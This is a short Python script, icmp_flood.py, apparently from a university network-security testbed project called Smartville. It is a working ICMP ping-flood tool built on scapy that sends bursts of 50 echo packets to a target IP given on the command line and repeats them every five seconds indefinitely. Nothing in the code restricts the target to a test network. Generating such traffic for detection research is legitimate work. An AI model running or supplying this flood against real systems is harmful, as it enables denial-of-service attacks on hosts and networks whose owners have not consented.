# This file is part of the "Smartville" project.
# Copyright (c) 2024 University of Insubria
# Licensed under the Apache License 2.0.
# SPDX-License-Identifier: Apache-2.0
# For the full text of the license, visit:
# https://www.apache.org/licenses/LICENSE-2.0

# Smartville is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# Apache License 2.0 for more details.

# You should have received a copy of the Apache License 2.0
# along with Smartville. If not, see <https://www.apache.org/licenses/LICENSE-2.0>.

# Additional licensing information for third-party dependencies
# used in this file can be found in the accompanying `NOTICE` file.
from scapy.all import ICMP, send, IP
import threading
import sys


NUM_OF_PACKETS = 50
INTERVAL_BETWEEN_PACKETS_SECS = 0.01
INTERVAL_BETWEEN_FLOOD_SECS = 5
TARGET_IP = None

def ping_flood():
    try:
        print(f"Sending {NUM_OF_PACKETS} packets with a delay of"+\
            f" {INTERVAL_BETWEEN_PACKETS_SECS} seconds to {TARGET_IP}")
        packet = IP(dst=TARGET_IP)/ICMP()
        send(packet, count=NUM_OF_PACKETS, inter=INTERVAL_BETWEEN_PACKETS_SECS, verbose=1)
    except ValueError:
        print("Please enter valid numbers for the count and delay.")

def repeat_function():
    # Define a function that repeats the given function with the specified interval
    ping_flood()  # Execute the function immediately
    threading.Timer(
        INTERVAL_BETWEEN_FLOOD_SECS, 
        repeat_function).start()

# Example usage
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 icmp_flood.py TARGET_IP")
        sys.exit(1)

    network = "192.168.1.0/24"  # Specify your network    
    TARGET_IP = sys.argv[1]  # Get the TARGET_IP from the command line arguments
   
    repeat_function()
        

